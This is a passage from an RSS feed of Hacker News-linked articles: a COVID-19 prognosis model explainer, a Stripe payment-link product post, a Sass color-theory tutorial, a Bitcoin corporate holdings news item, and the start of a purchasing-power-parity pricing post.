<p>Ensemble Learning is a powerful method of Machine Learning that trains and predicts with many models (ie many decision trees) at once to produce a single superior output.</p><p>Think of it as trying out a few different routes to a single location you’ve never been to; as you use all of the routes, you begin to learn which traffic lights take longer, when and how the time of day impacts one route over the other — allowing you to craft the perfect route. You experimented with and combined a few different models to reach an optimal conclusion. Ensemble learning is similar!</p>
<p><img alt="omermohamed.jpg" height="170" src="https://explainthispaper.s3.amazonaws.com/images/image.2e16d0ba.fill-200x200.jpg" width="169">
</p>
<p><span><b>
Omer Mohamed</b>
</span><br>
<span>Medical Student</span>
</p>
</div>
</div>
</section>
</div>
<div data-contentpath-field="block">
<p>The model output was set as either class 0 (death) or class 1 (survival).</p><p>As is usual for training classification models, the model was trained by comparing its predictions to the true outcomes of over 300 respective patients and then altering its decision steps accordingly.</p><p>Eventually, the trained model was tested on a separate set of patient data (the test set), from 110 new patients.</p>
</div>
<div data-contentpath-field="block">
<section>
<div>
<p><span data-contentpath-field="block">
<h3>How did the model do?</h3><p>The algorithm performed well 🎯. On the test set, it achieved an <sample>F1 score of 0.98</sample> for predicting survival and 0.90 for predicting death.</p>
</span>
</p>
<div data-contentpath-field="right">

<p>This is a score for assessing how well the model is making the correct prediction, ranging from 0 (really bad) to 1 (really good). It balances precision (if the algorithm makes a prediction, how confident can we be?) with sensitivity (of the outcome of interest, how many did it pick up correctly?)</p>
<p><img alt="chris.jpg" height="200" src="https://explainthispaper.s3.amazonaws.com/images/chris.2e16d0ba.fill-200x200.jpg" width="200">
</p>
<p><span><b>
Chris Lovejoy</b>
</span><br>
<span>Doctor and Data Scientist</span>
</p>
</div>
</div>
</section>
</div>
<div data-contentpath-field="block">
<section>
<div>
<p><span data-contentpath-field="block">
<p>The algorithm revealed that three key biomarkers in the blood had the biggest influence on predictions: <sample>LDH, hs-CRP and lymphocyte counts</sample>.</p>
</span>
</p>
<div data-contentpath-field="right">

<p>LDH and hs-CRP are proteins while lymphocytes are a type of immune cell. Basically, when the level of these go up, the more likely it is that the infection is serious.</p>
<p><img alt="chris.jpg" height="200" src="https://explainthispaper.s3.amazonaws.com/images/chris.2e16d0ba.fill-200x200.jpg" width="200">
</p>
<p><span><b>
Chris Lovejoy</b>
</span><br>
<span>Doctor and Data Scientist</span>
</p>
</div>
</div>
</section>
</div>
<div data-contentpath-field="block">
<p>They found F1 scores were highest when blood tests were taken close to the day of final outcome (death or survival). Even as far as 18 days before final outcome, the cumulative F1 scores were over 0.90.</p><h3>Want the nitty gritty? 🧐</h3><p>XGBoost is a type of tree ensembling method. It generates many different 'decision trees' then aggregates them together.</p><p>An advantage is that this can be very interpretable. The team produced two simple rules that would predict death in this population:</p><ol><li>LDH &gt; 365 or</li><li>hs-CRP &gt;41.2 and Lymphocyte &lt;14.7%</li></ol>
</div>
<div data-contentpath-field="block">
<h3>Where it all went wrong 😬</h3><p>The group didn't validate their model externally i.e. in another hospital. This is crucial when developing a model as it reduces overfitting of the model to one specific dataset. <a href="https://www.nature.com/articles/s42256-020-00254-2">Another group</a> tested the model in New York and the F1 score for predicting death was 0.41. Similarly low accuracy was reported in <a href="https://www.nature.com/articles/s42256-020-00252-4">France</a> and the <a href="https://www.nature.com/articles/s42256-020-00253-3">Netherlands</a>.</p><p>Also, this model's accuracy depended on how close to the final outcome it was applied. In real-life, doctors wouldn't know when the final outcome will happen.</p><p>The group didn't make it clear whether the model can be used as a triage tool at the first point of presentation to hospital. When the New York group applied the model at initial triage point, the F1 score for predicting death was still low, at 0.56.</p><p>(These performance issues are not confined to this particular model. A <a href="https://erj.ersjournals.com/content/56/6/2003498">review</a> of existing predictive models for COVID-19 found that none of them met the standard of accuracy that you get from simpler measures like oxygen levels. The review recommended that, in future, model developers must always externally validate their models.)</p><h3>So what?</h3><p>This paper made a lot of waves in the few months after it came out, with several direct replies and over 90 citations. There's clearly a lot of interest in predictive models for COVID-19. However, with the limitations highlighted above, it's unlikely that this exactly model will be used on a widespread scale.</p>
</div>
</div></div>]]>
            </description>
            <link>https://explainthispaper.com/ai-covid-prognosis-predictor/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26225784</guid>
            <pubDate>Mon, 22 Feb 2021 15:44:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: A paypal.me clone using Stripe]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26225504">thread link</a>) | @thomasisaac
<br/>
February 22, 2021 | https://tillypay.com/blog/open-payment-link-with-stripe/ | <a href="https://web.archive.org/web/*/https://tillypay.com/blog/open-payment-link-with-stripe/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
      <p>TL;dr If you wish to create your own Stripe Open Payment Link, like Paypal.me, you can use <a href="https://tillypay.com/">tillypay.com</a></p><p>One killer feature that Stripe hasn't made is a response to PayPal.me, this would be when the end client or user could enter the amount and continue to pay that amount.</p><p>It would be great if you could have the option to do this, so we built it! TillyPay is a verified Stripe Partner, this means we can control your Stripe platform on your behalf adding this much needed <strong>Open Pay Link</strong>. We call it OpenPay.</p><h3 id="introducing-openpay">Introducing OpenPay</h3><p>OpenPay will allow your customers to write in exactly <strong>amount</strong> they wish to pay and in the <strong>currency</strong> they wish to pay in.</p><p>You also operate this under your <strong>own domain</strong> rather than using ours.<br><strong>pay.yourcompany.com/open</strong> could lead to the page like below:</p><figure><img src="https://tillypay.com/blog/content/images/2020/11/Screenshot-2020-11-05-at-12.21.12.png"><figcaption>Example of an Open Payment Link for Stripe</figcaption></figure><p>The payment will be entered and created into your existing Stripe dashboard.</p><p><strong>Payment Methods</strong><br>We allow any payment method that Stripe uses, including Apple &amp; Google Pay, you can see this above under the "Pay Now&gt;" button will lead them to any system that they currently have installed on their system.</p><p>This is a lot more variety than PayPal's system, under business transactions this solution is cheaper.</p><h2 id="free-to-try-out">Free to try out</h2><p>To get started with TillyPay's OpenPay system, head over to our web app and get started</p><!--kg-card-begin: html--><a href="https://app.tillypay.com/signup?utm_source=blog-openpay">
  <svg width="309px" height="68px" viewBox="0 0 309 68" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
      <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
          <g id="Artboard" transform="translate(-31.000000, -46.000000)">
              <g id="Group-31" transform="translate(31.000000, 46.000000)">
                  <rect id="Rectangle" fill="#0F24CE" x="0" y="0" width="309" height="68" rx="4"></rect>
                  <text id="Create-an-Account" font-family="KohinoorBangla-Bold, Kohinoor Bangla" font-size="30" font-weight="bold" fill="#FFFFFF">
                      <tspan x="23.305" y="44">Create an Account</tspan>
                  </text>
              </g>
          </g>
      </g>
  </svg>
</a><!--kg-card-end: html-->
    </section></div>]]>
            </description>
            <link>https://tillypay.com/blog/open-payment-link-with-stripe/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26225504</guid>
            <pubDate>Mon, 22 Feb 2021 15:21:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Practical Color Theory for People Who Code (2016)]]>
            </title>
            <description>
<![CDATA[
Score 80 | Comments 28 (<a href="https://news.ycombinator.com/item?id=26225339">thread link</a>) | @martinlaz
<br/>
February 22, 2021 | http://tallys.github.io/color-theory/ | <a href="https://web.archive.org/web/*/http://tallys.github.io/color-theory/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><header>
	
	<h3>Natalya Shelburne
		<br>
		<a href="https://twitter.com/natalyathree">@natalyathree</a>
	</h3>
</header>
	
		<div>
			<div>
				<div>
					

					<div><p>
						Hi! I'm Natalya! <img src="http://tallys.github.io/color-theory/images/tally-pic.jpg" title="natalya-profile" description="vector art self portrait">I'm a classically trained fine artist who spent 6 years teaching people how to paint, draw, and grow their creativity. I am now a front end developer, and I love writing code as much as I love painting. </p><p>I have a degree in Studio Art, a bachelor's in Developmental Psychology, and a master's degree in Creativity and Talent Development. But, most importantly, I have mixed gallons and gallons of paint. </p><p>I abstracted my domain knowledge as a fine artist into variables and functions in order to reveal color selection as being logical, predictable, and driven by principles anyone can learn. Sass color functions give you the same creative power as owning a set of paints, brushes, and canvas. </p><p>This is a demo of my functions for a complementary color scheme - pick any color on the color wheel and the functions will make sure that the scheme will still work! 🎨</p></div>
					</div>
					<div>
						
					
					<h4>Completely new to this? Check out these resources first:</h4>
					
				</div>
			</div>
		</div>
		<a href="#" name="start"></a>
<section>
	<h2>Let's build a Complementary Color Scheme!</h2>
	<img src="http://tallys.github.io/color-theory/images/color-circle.png" alt="color-wheel" title="color wheel" description="the color wheel with corresponding hsl degrees">
	<p>This is the color wheel, consider this the documentation for using color. <br> Notice that the degrees on the color wheel correspond to colors.</p>
	
</section>

<section>
	<h2>Pick a color <span> hsl($hue, $saturation, $lightness)</span></h2>
	<div>
		
		<p>Pick any color by selecting its hue (0-360) on the color wheel at full saturation (100%) and at half lightness (50%) - this way you start with the 'most colorful color' you can get.</p>
		<p>This is what your website will look like if you set every element to this one color. Notice how you can't tell one item from another. Color is information.</p>
	</div>
	<div>

		<div>

	
	
	<div>
		<p> tiny lorem ipsum tiny lorem ipsum tin rem ipsum ?</p>
	<p> tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tinyny lorem ipsum </p>
	<p>cta
	</p></div>
	
</div>


	</div>
	<div>
		
		<div>
			<p>Why pick a fully saturated color, but only half lightness?</p>
			<p>Ever mix up a bunch of colors only to end up with a gray blob? In the real world, you can't mix a color to be more saturated - you only "lose" color information as you mix. So, the practice is to start with the most saturated colors at their most chromatic so you can still have a full range of mixing opportunities.</p>
		</div>
		
	</div>
</section>


<section>
	<h2>Generate Complementary Color<span>complement( );</span></h2>
	<div>
		
		<p>Generate your second color without having to guess what will work. Thanks to science and wavelengths, we know that this works. The opposition of these two colors stimulate your photoreceptor cells in a good way!</p>
		<p>Finally! A different color - now hue separates elements from each other and a layout can be seen.</p>
	</div>
	<div>
		<div>

	
	
	<div>
		<p> tiny lorem ipsum tiny lorem ipsum tin rem ipsum ?</p>
	<p> tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tinyny lorem ipsum </p>
	<p>cta
	</p></div>
	
</div>

	</div>
	<div>
		
		<p>The complement to any color is always 180 degrees across on the other side of the color wheel. If you've ever wondered why it's the color wheel instead of a color line, this is part of that answer. Remember that the color wheel is our visual documentation for color relationships. <br> Fun fact, if you mix complementary colors, they'll cancel each other out and you'll end up with a neutral gray.</p>
		
	</div>
</section>

<section>
	<h2>Color Relationship Established by Mixing<span>harmonious-mix( );</span></h2>
	<div>
		
		
		<p>Establish a color relationship by mixing them together. This makes the colors look like they're under similar lighting conditions.</p>
		<p>Here, you see less saturated hues, with a clear relationship between each other.</p>
		</div>
		<div>
			<div>

	
	
	<div>
		<p> tiny lorem ipsum tiny lorem ipsum tin rem ipsum ?</p>
	<p> tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tinyny lorem ipsum </p>
	<p>cta
	</p></div>
	
</div>

		</div>
		<div>
			
			<div>
				<p>Our eyes may be legacy systems, but they are really good at spotting patterns, especially things that look like they don't belong in a set.</p>
				<p>This mixing method is another way we can simulate lighting and color found in nature. It's a bit more complicated, but my favorite way of explaining it is this: Everything outside has some "yellow" mixed in from the sunshine during the day. Same thing happens when everyone and everything looks bad in photos taken under the glow of green flourescent lights - there is green added to all of the colors you're looking at, including adding a green glow to your skin if you're standing under the flourescent light yourself. Whether it looks good or bad, this color (light) mixing creates a visual harmony. We don't really notice it when it's there, but we really notice its absence.</p>
				<p>When you're painting, you want to simulate similar lighting conditions for a scene, and that effect is accomplished mixing a bit of one color into the other. Mixing different ratios of the same colors will usually generate a matching color palette.</p>
				<p>How do I decide what to do? Thanks to art school and science, I know that cool colors have lower luminosity than warm colors, and will dominate in mixes, with yellow being the lightest color. For example, a touch of blue will really affect yellow, whereas you can add a lot of yellow to blue before it is affected. So, here is this decision making in function form - I am weighing different colors differently when mixing.</p>
	</div>
		
		
		
</div>
</section>

<section>
	<h2>Create Neutrals<span>mix-neutral( ); lighten( ); darken( );</span></h2>
	<div>
		
		
		
		<p>Let your chosen color pop (in other words, don't exhaust your eyes by making them process non-stop intense chromatic colors!) by surrounding it with neutrals. Desaturate the painter way: by mixing complementary colors! Then, vary that neutral's lightness to create a highlight and a shadow.</p>
		<p>Making the complementary color neutrals will help the 'call to action' color you selected stand out - notice how much the button in the top right "pops" all of a sudden. Make things "pop" by making other things around them not pop.</p>
	</div>
	<div>
		<div>

	
	
	<div>
		<p> tiny lorem ipsum tiny lorem ipsum tin rem ipsum ?</p>
	<p> tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tinyny lorem ipsum </p>
	<p>cta
	</p></div>
	
</div>

	</div>
	<div>
		
		
		
		<p>We can do the same for our primary color too. More neutrals to work with.</p>
		<p>Doesn't it seem like we went too far with this whole making things neutral? Now, nothing "pops"! But, on the plus side, none of this seems to be irritating any eyeballs, either. Remember that our eyes don't like to handle seeing everything our computers are capable of rendering.</p>
	</div>
	<div>
		<div>

	
	
	<div>
		<p> tiny lorem ipsum tiny lorem ipsum tin rem ipsum ?</p>
	<p> tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tiny lorem ipsum tinyny lorem ipsum </p>
	<p>cta
	</p></div>
	
</div>

	</div>
	<div>
		
		<div>
			<p>The colors are way too intense at their full saturation for our eyes to handle. If all the colors are bright, none of the colors are bright.</p>
			<p>I picked my starting color for a reason -  I want that to be the heart of my design! That means the complementary color should support the chosen color, and we do that by mixing neutrals. Our eyes don't really handle saturated colors very well next to other saturated colors. Our eyes get confused at the edges - is it this color or the other one? Ahh both! We end up seeing optical illusions. Just give your eyes a break between super strong saturated colors with neutrals so they don't stress out about that much visual information. At the very minimum a rule of thumb is that your viewport should have 33% neutral space (white, desaturated, or black colors) so your poor eyes can have a break and process the information right. Otherwise you get eye strain!</p>
		</div>
		
	</div>
</section>

<section>
	<h2>Why not just desaturate?<span>mix-neutral( ); lighten( ); darken( );</span></h2>
		<p>You totally can! Desaturate does a great job. But, I think not only is it important to understand what "desaturate" means. How would you desaturate a real color in the real world? Remember, you want "ugly" colors for your neutrals! You want to create bland and forgettable colors that recede into the background. These ugly duckling colors are how you get those other call to actions and buttons "pop"!</p>

		<h3>Primary and complementary Colors</h3>
			
			
		<h3>Mixed neutrals</h3>
			
			


		<h3>Desaturated neutrals</h3>
			
			

		<div>
			
			<p>Even though these may look "ugly", neutral colors are the heart of any painting, and that is the case on the web, too. Notice that the same decisions are …</p></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://tallys.github.io/color-theory/">http://tallys.github.io/color-theory/</a></em></p>]]>
            </description>
            <link>http://tallys.github.io/color-theory/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26225339</guid>
            <pubDate>Mon, 22 Feb 2021 15:07:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Public stocks like Tesla and Square gain $5B on their Bitcoin]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26225267">thread link</a>) | @senor_lecce
<br/>
February 22, 2021 | https://protos.com/bitcoin-treasuries-tesla-square-crypto-stocks-investment/ | <a href="https://web.archive.org/web/*/https://protos.com/bitcoin-treasuries-tesla-square-crypto-stocks-investment/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-2694">
<header>


</header>
<figure>
<img width="889" height="500" src="https://protos.com/wp-content/uploads/2021/02/Protos-Artwork-Bitcoin50.jpg" alt="stocks, bitcoin" loading="lazy" srcset="https://protos.com/wp-content/uploads/2021/02/Protos-Artwork-Bitcoin50.jpg 1920w, https://protos.com/wp-content/uploads/2021/02/Protos-Artwork-Bitcoin50-300x169.jpg 300w, https://protos.com/wp-content/uploads/2021/02/Protos-Artwork-Bitcoin50-1024x576.jpg 1024w, https://protos.com/wp-content/uploads/2021/02/Protos-Artwork-Bitcoin50-768x432.jpg 768w, https://protos.com/wp-content/uploads/2021/02/Protos-Artwork-Bitcoin50-1536x864.jpg 1536w" sizes="(max-width: 889px) 100vw, 889px">

</figure>
<main>
<div>
<p>Publicly traded stocks like Tesla and Square are <strong>up over $5 billion</strong> on their Bitcoin investments.</p>
<p>According to <a href="https://bitcointreasuries.org/" target="_blank" rel="noreferrer noopener">Bitcoin Treasuries</a>, public companies have so far together spent $3 billion to acquire 151,919 BTC — worth $8 billion at current prices.</p>
<ul><li>Michael Saylor’s <a href="https://www.protos.com/microstrategy-grows-bitcoin-holding/" target="_blank" rel="noreferrer noopener">MicroStrategy</a> <strong>spent $1.15 billion</strong> on 71,079 BTC (now worth $3.9 billion).</li><li><strong>Tesla’s up 70%</strong> on its 48,000 BTC (bought for $1.5 billion, now worth $2.5 billion).</li><li>Canada’s Galaxy Digital is third, having bought <strong>16,402 BTC for $134 million</strong> — now worth just under $900 million.</li></ul>
<p>Jack Dorsey’s <a href="https://protos.com/square-bitcoin-jack-dorsey-whitepaper-craig-wright-crypto/" target="_blank" rel="noreferrer noopener">fintech Square</a> gets a notable mention. The firm behind Cash App <strong>spent $50 million</strong> on 4,709 BTC <a href="https://www.theverge.com/2020/10/8/21507533/square-50-million-bitcoin-dorsey-cryptocurrency" target="_blank" rel="noreferrer noopener">last October</a> — now it’s worth $250 million, a 400% increase in five months.</p>
<p><a href="https://public.flourish.studio/visualisation/5364437/?utm_source=embed&amp;utm_campaign=visualisation/5364437" target="_top" rel="noopener"><img alt="Made with Flourish" src="https://public.flourish.studio/resources/made_with_flourish.svg"> </a></p>
<p>It should be noted these figures only make sense if the companies <strong>have held their Bitcoin</strong>. Public stocks often disclose asset sales months after the fact.</p>
<p>In any case, investors in <strong>crypto-specific stocks</strong> like Voyager Digital, Riot Blockchain, and Marathon Patent Group are even better off. </p>
<p>Bitcoin’s historic rallies have pushed their <strong>share prices up thousands of percent</strong> over the past year.</p>
<p>For scale, Bitcoin itself is up around 480% while the S&amp;P 500 has gained 15%.</p>
<p><a href="https://public.flourish.studio/visualisation/5364733/?utm_source=embed&amp;utm_campaign=visualisation/5364733" target="_top" rel="noopener"><img alt="Made with Flourish" src="https://public.flourish.studio/resources/made_with_flourish.svg"> </a></p>
<p><em>[Read more: <a href="https://protos.com/bitcoin-price-candles-tesla-crypto-history/" target="_blank" rel="noreferrer noopener">Chasing candles — here’s where Bitcoin’s ‘Tesla pump’ ranks in history</a>]</em></p>
<p>But while Tesla’s Bitcoin buy <a href="https://protos.com/bitcoin-tesla-elon-musk-price-record-crypto-purchase/" target="_blank" rel="noreferrer noopener">captured the world’s attention</a>, the influence of BTC’s volatility <strong>could be more apparent</strong> in MicroStrategy’s share price.</p>
<p>After all, more than <strong>40% of MicroStrategy’s market value</strong> is directly derived from its Bitcoin stash. If Bitcoin corrects — so might MSTR stock.</p>
</div>
</main>
</article></div>]]>
            </description>
            <link>https://protos.com/bitcoin-treasuries-tesla-square-crypto-stocks-investment/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26225267</guid>
            <pubDate>Mon, 22 Feb 2021 15:01:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Purchasing Power Parity: fair pricing for [a] SaaS product]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26225110">thread link</a>) | @moviuro
<br/>
February 22, 2021 | https://scastiel.dev/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/ | <a href="https://web.archive.org/web/*/https://scastiel.dev/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
      <header>
<picture><source srcset="https://d33wubrfki0l68.cloudfront.net/5031f41aa35ca0f024a011e593598bd643121eb1/97562/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/cover.200.webp 200w, https://d33wubrfki0l68.cloudfront.net/856e13c61ac6fd2ad6b524d6f58ae7ba58a95ad7/559cb/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/cover.450.webp 450w, https://d33wubrfki0l68.cloudfront.net/9f98b77279c3dfa86e83912a0400edff9229768b/87f5d/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/cover.700.webp 700w, https://d33wubrfki0l68.cloudfront.net/04d30fc4482a7323c4bdae17a59b336b6cb6f393/2be42/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/cover.950.webp 950w, https://d33wubrfki0l68.cloudfront.net/a2c402ca694d8221ecfb49a1e6c6e0a10e87d00d/319ab/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/cover.1200.webp 1200w" sizes="100vw" type="image/webp"><source srcset="https://d33wubrfki0l68.cloudfront.net/e7ac2ac5bd77ff6af09c5a6522516b7c4908eed9/5b7d8/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/cover.200.jpg 200w, https://d33wubrfki0l68.cloudfront.net/3816c586aed20fc298e4e9ad4505ea6d3e879cdc/762f4/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/cover.450.jpg 450w, https://d33wubrfki0l68.cloudfront.net/1abd4a439b43146b37052fa3e08c1bcf2d8bd9a2/36a9e/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/cover.700.jpg 700w, https://d33wubrfki0l68.cloudfront.net/11786dbadf9847aed0650ae2d01c8dedc181845b/3e0f3/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/cover.950.jpg 950w, https://d33wubrfki0l68.cloudfront.net/a1c69f33676ccea0c5e9cf5aa2893666af2a2f87/0cec5/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/cover.1200.jpg 1200w" sizes="100vw" type="image/jpeg"><img src="https://scastiel.dev/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/cover.jpg" alt="Purchasing Power Parity: fair pricing for your SaaS product" height="800" width="1200" loading="lazy"></picture>

<p><small>22 Feb 2021 — 10 min read</small></p>
</header>
<p>I released <a href="https://useeffect.dev/?ref=PostPPP">my course about React hooks</a> a couple of weeks ago. As with any SaaS product, I asked myself the usual question: what should be my product's price?</p>
<p>Economists would say that the right price should be when the offer curve crosses the demand one. But I’m not an economist, and this model seems to be valid for a given place (country), not when you sell something worldwide.</p>
<p>Using Purchasing Power Parity will help me solve this problem. After I explained what it is, I’ll show you how I implemented it on my course’s selling page using serverless functions and a little bit of React.</p>
<h2 id="what-is-purchasing-power-parity%3F">What is Purchasing Power Parity?</h2>
<p>At the core of the <a href="https://www.investopedia.com/updates/purchasing-power-parity-ppp/">Purchasing Power Parity</a> (PPP) is the following idea: a fair price in Switzerland will have no chance to convince anyone to buy in Somalia. It is an extreme example, but you get the idea.</p>
<p>And it isn’t new when you think about it: the same Spotify subscription doesn’t cost the same depending on where you are:</p>
<figure><picture><source srcset="https://d33wubrfki0l68.cloudfront.net/89052b2b947fbf8259d51c2751dcaa06bdaee0c3/74270/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/spotify_pricing.200.webp 200w, https://d33wubrfki0l68.cloudfront.net/ab8b58aad667c00361d026347fba6d2bbd9a0ba1/7d69b/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/spotify_pricing.450.webp 450w, https://d33wubrfki0l68.cloudfront.net/d5ed0dc7c42efbfd2e40caf895d2d82ec78be76c/ca1bd/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/spotify_pricing.700.webp 700w, https://d33wubrfki0l68.cloudfront.net/6b857abc4496b45c09e17e35226885e61ef65b7f/79d43/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/spotify_pricing.950.webp 950w, https://d33wubrfki0l68.cloudfront.net/414f767240038f5cac871a24846b591ec13603bf/72843/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/spotify_pricing.1200.webp 1200w" sizes="100vw" type="image/webp"><source srcset="https://d33wubrfki0l68.cloudfront.net/b00584bea4aec8818aaee8b3c6a5e7fab992765b/b54b8/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/spotify_pricing.200.png 200w, https://d33wubrfki0l68.cloudfront.net/89df9581a5ac55a702c38b30e0d858c8ed3e622f/75146/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/spotify_pricing.450.png 450w, https://d33wubrfki0l68.cloudfront.net/34d5759d7a1c0470835381b7dd7ec59c577b286b/8c33a/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/spotify_pricing.700.png 700w, https://d33wubrfki0l68.cloudfront.net/31fb64ed77254700386e3845e01ff320d71dcab2/dcb2a/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/spotify_pricing.950.png 950w, https://d33wubrfki0l68.cloudfront.net/a7c3dc38114cb28bfb656cb12eca39cd8b1876f9/ed710/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/spotify_pricing.1200.png 1200w" sizes="100vw" type="image/png"><img src="https://scastiel.dev/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/spotify_pricing.png" alt="" height="731.3432835820896" width="1200" loading="lazy"></picture><figcaption>In Denmark, a Spotify subscription costs $18, but less than $3 in Philippines. Source: <a href="https://mts.io/projects/spotify-pricing/">Spotify Premium Index (2014)</a></figcaption></figure>
<p>And the reason for this difference is obvious: purchasing power is not the same across the world. Several indices exist to measure this phenomenon, the most famous in popular culture being the <a href="https://en.wikipedia.org/wiki/Big_Mac_Index">Big Mac Index</a>.</p>
<p>Big companies such as Spotify can adjust their pricing in every country they are in, but what about you with your SaaS? You don’t have headquarters in all countries, yet you sell your product worldwide.</p>
<p>To solve this problem, a tendency emerged these past few months: using PPP to offer your product at a lower price where the purchasing power is lower.</p>
<p>For instance, you can purchase my course at its base price of $50 (when I’m writing this post) in Switzerland or Denmark, $25 in Romania or Albania, and $5 in Somalia or Liberia.</p>
<p>To me, using PPP for your pricing has two advantages:</p>
<ul>
<li>it is <strong>fair</strong>: I want my course to be available to the most people, especially people who could use it to improve their economic situation by learning new skills;</li>
<li>it is <strong>profitable</strong>: even if low-PPP countries won’t be the ones bringing you the most significant revenue, it is still better than nothing, i.e., a pricing way too high for these countries.</li>
</ul>
<p><em>Note that I’m not yet able to confirm the second hypothesis for my case since I just released my course. And even then, confirming it would require an experimental system with a large sample.</em></p>
<p>Let’s say I convinced you to use PPP for your product’s pricing; how can you implement it?</p>
<h2 id="how-to-add-ppp-to-your-site%3F">How to add PPP to your site?</h2>
<p>For the rest of this post, I’ll suppose you have a product, and its selling page uses Stripe, React and serverless functions (e.g. with <a href="https://nextjs.org/">Next.js</a> or <a href="https://functions.netlify.com/">Netlify</a> functions).</p>
<p>It’s quite a big assumption, but it shouldn’t be too much trouble to use the principles to adapt them to your use case.</p>
<p>I created a small demo website to understand what it can look like when you offer purchasing power parity. <a href="https://github.com/scastiel/parity.coffee">Its source code is available on GitHub</a>, and it presents an implementation for the two first options I will describe here.</p>
